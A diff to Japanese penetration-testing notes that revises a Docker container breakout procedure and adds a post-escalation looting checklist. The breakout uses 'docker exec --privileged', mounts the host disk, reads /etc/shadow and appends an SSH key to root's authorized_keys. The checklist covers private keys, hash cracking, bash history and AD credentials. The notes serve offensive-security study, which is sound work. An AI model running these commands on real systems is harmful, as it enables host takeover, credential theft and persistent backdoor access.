@@ -198,29 +198,53 @@ sudo /snap/bin/docker exec --user root [CONTAINER_ID] /bin/sh
 sudo /snap/bin/docker exec -it --user root [CONTAINER_ID] /bin/bash
 ```
 
-**ステップ3b: ホストのブロックデバイスをマウント（Docker ブレイクアウト）**
+**ステップ3b: `--privileged` フラグ付きでコンテナ内に root インタラクティブシェルを取得**
 
-コンテナが privileged モードで動作しているか、ホストのデバイスにアクセスできる場合：
+`docker exec` に `--privileged` フラグを付けることで、**コンテナの起動設定に関係なく**、exec されたプロセスに特権 capabilities が付与される。これにより、コンテナ内から `/dev/sda*` 等のホストのブロックデバイスが見えるようになりマウントが可能になる。
 
 ```bash
-# ブロックデバイスの確認
-sudo /snap/bin/docker exec --user root [CONTAINER_ID] ls /dev/sd*
+# [Attacker] --privileged + インタラクティブシェルでコンテナ内に入る
+sudo /snap/bin/docker exec -u root --privileged -it [CONTAINER_ID] bash
+# bash が使えない場合
+sudo /snap/bin/docker exec -u root --privileged -it [CONTAINER_ID] /bin/sh
+```
 
-# ホストのルートパーティションをマウント
-sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
-  sh -c 'mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && ls /mnt/host'
+**ステップ3c: コンテナ内でホストデバイスを特定してマウント**
 
-# ホストの shadow / 権限確認用ファイルを読み取る
-sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
-  sh -c 'cat /mnt/host/etc/shadow | head -1'
+```bash
+# [Target: コンテナ内] mount コマンドでマウント状況を確認する
+# /etc/hostname や /etc/hosts が /dev/sda* 系のデバイスからマウントされていれば
+# そのデバイスがホストのルートパーティション
+mount
+# 出力例（ホストの設定ファイルがコンテナにバインドマウントされている場合）:
+# /dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime)
+# /dev/sda1 on /etc/hostname type ext4 (rw,relatime)  ← ホストのデバイス名が判明
+# /dev/sda1 on /etc/hosts type ext4 (rw,relatime)
 
-# ホストに root SSH 公開鍵を書き込む（永続化）
-sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
-  sh -c 'echo "ssh-rsa [YOUR_PUBKEY]" >> /mnt/host/root/.ssh/authorized_keys'
+# mount 出力から特定したデバイスをマウントする
+# （環境によって vda1 / nvme0n1p1 等デバイス名が異なる。lsblk でも確認可能）
+mount /dev/sda1 /mnt
+
+# マウント成功確認
+ls /mnt
+# bin  boot  etc  home  root  ...  ← ホストのファイルシステムが見える
+
+# ホストの shadow を取得（横展開観点）
+cat /mnt/etc/shadow | head -3
+
+# ホストの root に SSH 公開鍵を書き込む（root シェル取得）
+echo '[SSH_PUBKEY]' >> /mnt/root/.ssh/authorized_keys
+```
+
+コンテナを抜けてホストに SSH 接続する：
+```bash
+# [Attacker] ホスト側に直接 SSH（公開鍵認証）
+ssh -i [PRIVATE_KEY_PATH] root@[TARGET_IP]
 ```
 
 ### 注意点・落とし穴
-- コンテナが通常モード（non-privileged）でも `/dev/sda*` が見えることがある。見えたらマウントを試みる
+- **`--privileged` フラグは `docker exec` のオプションとして使う。** コンテナ自体を再起動する必要はない。`docker exec --privileged` は exec されたプロセス（bash 等）にだけ特権を付与する
+- コンテナが通常モード（non-privileged）で起動していても `--privileged` を `docker exec` に付ければブロックデバイスが見える
 - `-it` フラグ（インタラクティブ + TTY）は TTY を確保するが、環境によっては動作しない。その場合は `-i` のみ、または `sh -c '[COMMAND]'` を使う
 - マウント後のパスはコンテナ内のパス。ホストの `/etc/shadow` は `/mnt/host/etc/shadow` でアクセス
 - ホストのファイルシステムへの書き込みも可能なため、SSH 鍵の埋め込みや `/etc/passwd` の書き換えも実施できる
@@ -350,6 +374,22 @@ rm [作成したファイル名]
 - 後：bash -p での root シェル取得 → `Enumeration_Checklist.md`（侵入後列挙）
 - YAML.load が任意コード実行できる原理 → `../06_Concepts/YAML_Deserialization.md`
 - `.bundle/config` 等からの認証情報取得（横移動に必要） → `../02_Initial_Access/Credential_Discovery.md`
+
+---
+
+---
+
+## 昇格成功後に確認すること（横展開観点）
+
+**「sudo で root になれた = ゴール」ではない。** root 権限を得た時点で以下を確認し、横展開・証跡収集を行う。
+
+- `/root/.ssh/` 配下の秘密鍵 → 他ホストへの SSH 接続性の確認
+- `/etc/shadow` 全エントリのハッシュ → 他システムでのパスワード使い回し検証（`hashcat` で一括クラック）
+- `/root/.bash_history` → 直近の接続先・コマンド履歴（他ホスト・サービスへの接続情報が残っている場合がある）
+- root cron / systemd サービスへの認証情報の埋め込み（設定ファイル・スクリプト）
+- **Docker ブレイクアウト成功時**：ホスト FS マウント後に `/mnt/root/.ssh/` / `/mnt/etc/shadow` / `/mnt/root/.bash_history` を確認する
+- 内部サービス（DB・管理画面・API）の設定ファイル・環境変数 → 接続情報・シークレット
+- AD 連携設定（`/etc/sssd/sssd.conf` / `/etc/krb5.conf`）→ ドメイン側資格情報の可能性
 
 ---
 
